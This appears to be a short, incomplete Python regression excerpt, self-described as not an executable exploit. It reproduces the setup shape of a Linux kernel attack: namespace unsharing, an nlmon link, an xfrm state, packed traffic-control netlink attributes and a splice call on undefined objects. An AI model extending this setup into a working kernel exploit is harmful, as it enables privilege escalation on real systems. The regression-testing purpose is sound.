# Source-shape regression excerpt, not an executable exploit.
import os
import struct
import subprocess
TCA_PEDIT_PARMS = 2
TCA_EGRESS_REDIR = 1
os.unshare(os.CLONE_NEWUSER | os.CLONE_NEWNET)
subprocess.run(["ip", "link", "add", "monitor7", "type", "nlmon"], check=True)
subprocess.run(["ip", "xfrm", "state", "add", "src", "127.0.0.1",
                "dst", "127.0.0.1", "proto", "esp", "spi", "256"], check=True)
edit_attr = struct.pack("HH", 24, TCA_PEDIT_PARMS)
redirect_attr = struct.pack("i", TCA_EGRESS_REDIR)
os.splice(read_pipe, udp_socket, 64)
